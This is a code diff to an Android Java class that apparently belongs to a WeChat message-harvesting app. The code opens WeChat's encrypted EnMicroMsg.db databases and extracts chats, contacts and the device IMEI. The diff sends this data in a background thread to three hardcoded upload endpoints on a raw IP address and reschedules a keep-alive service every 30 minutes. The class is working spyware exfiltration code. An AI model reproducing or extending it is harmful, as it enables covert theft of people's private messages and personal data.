@@ -34,6 +34,7 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 import static cn.truistic.enmicromsg.common.util.DeviceUtil.formatTime;
+import static net.sqlcipher.database.SQLiteDatabase.openOrCreateDatabase;
 
 /**
  * HomePresenter
@@ -43,7 +44,13 @@ public class HomePresenter implements MainMVP.IHomePresenter {
     private byte[] mLvbuffer,mLvbuff;
     private int msgId,mVaid;
 
-    private static final String urlPath = "http://113.105.55.205:8090/UpData/ReceiveWeChat.aspx";
+    private static final String ContentUrlPath =
+            "http://113.105.55.205:8090/UpData/ReceiveContent.aspx";
+    private static final String MessageUrlPath =
+            "http://113.105.55.205:8090/UpData/ReceiveMessage.aspx";
+    private static final String UserInfoUrlPath =
+            "http://113.105.55.205:8090/UpData/ReceiveUserInfo.aspx";
+
 
     private String mContent,mCreateTime,mTalker,
             mIsSend,mUserName,mAlias,mNickName,mMsgSvrId,mType,mStatus,mIsShowTimer,mReserved,mImgPath,mTransContent
@@ -210,19 +217,24 @@ public class HomePresenter implements MainMVP.IHomePresenter {
         mJsonContent = JsonUtil.toJson(mContentInfos);
         mJsonUser = JsonUtil.toJson(mUserInfos);
 
-        postJson(mJsonMessage);
-        postJson(mJsonContent);
-        postJson(mJsonUser);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                postJson(MessageUrlPath,mJsonMessage);
+                postJson(ContentUrlPath,mJsonContent);
+                postJson(UserInfoUrlPath,mJsonUser);
+            }
+        }).start();
 
         return true;
     }
 
-    private void postJson(String s) {
+    private void postJson(String url,String s) {
         MediaType JSON = MediaType.parse("application/json; charset=utf-8");
         OkHttpClient client = new OkHttpClient();//创建okhttp实例
         RequestBody body=RequestBody.create(JSON,s);
         Request request = new Request.Builder()
-                .url(urlPath)
+                .url(url)
                 .post(body)
                 .build();
         okhttp3.Call call = client.newCall(request);
@@ -264,7 +276,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 Intent whiteIntent = new Intent(context, WhiteService.class);
                 context.startService(whiteIntent);
             }
-        },1000 * 30);  //30秒
+        },1000 * 60 * 30);  //30秒
         return true;
     }
 
@@ -375,7 +387,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
             mTime = (String) SharedPerfUtil.getParam(context,"last_time_wechat","0");
             mSelection = "createTime > ?";
             try {
-                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
+             database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                 break;
             } catch (Exception e) {
                 j++;
@@ -425,8 +437,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 }
 
                 mMessageInfo = new MessageInfo(imei,msgId,mMsgSvrId,mType,mStatus,mIsSend,
-                        mIsShowTimer,
-                        formatTime(mCreateTime),mTalker,mContent,mImgPath,mReserved,mLvbuffer,mTransContent,
+                        mIsShowTimer,formatTime(mCreateTime),mTalker,mContent,mImgPath,mReserved,mLvbuffer,mTransContent,
                         mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChaId,mBizChatUserId,
                         mMsgSeq,mFlag);
 
@@ -479,7 +490,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
         for (int i = 0; i < num; i++) {
             dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
             try {
-                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
+                database = openOrCreateDatabase(dbFile, dbPwd, null, hook);
                 break;
             } catch (Exception e) {
                 j++;
@@ -569,7 +580,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
         for (int i = 0; i < num; i++) {
             dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
             try {
-                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
+                database = openOrCreateDatabase(dbFile, dbPwd, null, hook);
                 break;
             } catch (Exception e) {
                 j++;
